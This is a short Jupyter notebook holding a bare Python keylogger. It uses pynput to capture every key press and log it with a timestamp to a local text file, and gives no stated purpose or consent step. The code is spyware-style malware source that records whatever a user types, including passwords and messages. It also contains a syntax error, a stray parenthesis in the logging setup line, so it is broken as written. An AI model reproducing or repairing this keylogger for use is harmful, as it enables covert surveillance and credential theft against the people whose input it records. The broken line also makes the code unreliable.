{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": null,
   "metadata": {},
   "outputs": [],
   "source": [
    "from pynput.keyboard import Key, Listener\n",
    "import logging\n",
    "\n",
    "log_directory = \"\"\n",
    "logging.basicConfig(filename = log_directory + \"log_results.txt\"), level = logging.DEBUG, format = '%(asctime)s : %(message)s')\n",
    "\n",
    "def keypress(Key):\n",
    "\n",
    "    logging.info(str(Key))\n",
    "\n",
    "with Listener(on_press = keypress) as listener:\n",
    "        listener.join()\n",
    "    \n"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python 3",
   "language": "python",
   "name": "python3"
  },
  "language_info": {
   "codemirror_mode": {
    "name": "ipython",
    "version": 3
   },
   "file_extension": ".py",
   "mimetype": "text/x-python",
   "name": "python",
   "nbconvert_exporter": "python",
   "pygments_lexer": "ipython3",
   "version": "3.7.1"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 2
}
